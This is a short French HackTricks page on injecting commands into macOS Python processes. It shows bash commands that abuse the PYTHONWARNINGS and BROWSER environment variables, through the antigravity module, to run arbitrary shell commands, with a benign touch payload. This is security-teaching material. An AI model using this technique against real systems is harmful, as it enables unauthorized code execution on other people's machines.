# Injection d'application Python macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d'environnement `PYTHONWARNINGS` et `BROWSER`

Si un attaquant peut contrôler l'environnement d'un processus Python, la combinaison de `PYTHONWARNINGS` et `BROWSER` peut déclencher une exécution de commandes lorsque Python importe le module `antigravity` pendant le traitement d'une option d'avertissement spécialement conçue. Cette technique repose sur l'ouverture d'une URL par `antigravity` avec le module `webbrowser` de Python, qui respecte la variable d'environnement `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking avec les variables d'environnement - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
